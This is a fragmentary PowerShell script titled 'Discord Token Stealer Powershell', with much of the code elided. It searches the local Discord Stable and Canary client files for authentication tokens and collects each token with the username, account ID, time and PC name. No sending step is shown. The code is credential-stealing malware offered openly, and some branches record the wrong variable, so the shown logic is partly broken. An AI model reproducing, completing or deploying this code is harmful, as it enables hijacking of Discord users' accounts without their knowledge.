    ...
    Foreach ($file in $files)
    {
        ...
        if ($mfa.length -gt 1) {
...

            {
                ...
                $possibleTokens += "Type = MFA`nLocation = DiscordStable`nToken = $mfa`nUsername = $user`nID = $id`nTime = $(Get-Date)`nPC Name = $env:computername"
            ...
            if ($tkn.length -gt 2) {
...

                {
                    ...
                    $possibleTokens += "Type = NO MFA`nLocation = DiscordStable`nToken = $mfa`nUsername = $user`nID = $id`nTime = $(Get-Date)`nPC Name = $env:computername"
...

    {
        ...
        if ($mfa.length -gt 1) {
...

            {
                ...
                $possibleTokens += "Type = MFA`nLocation = DiscordCanary`nToken = $mfa`nUsername = $user`nID = $id`nTime = $(Get-Date)`nPC Name = $env:computername"
            ...
            if ($tkn.length -gt 2) {
...

                {
                    ...
                    $possibleTokens += "Type = NO MFA`nLocation = DiscordCanary`nToken = $mfa`nUsername = $user`nID = $id`nTime = $(Get-Date)`nPC Name = $env:computername"
...
$title       = 'Discord Token Stealer Powershell'
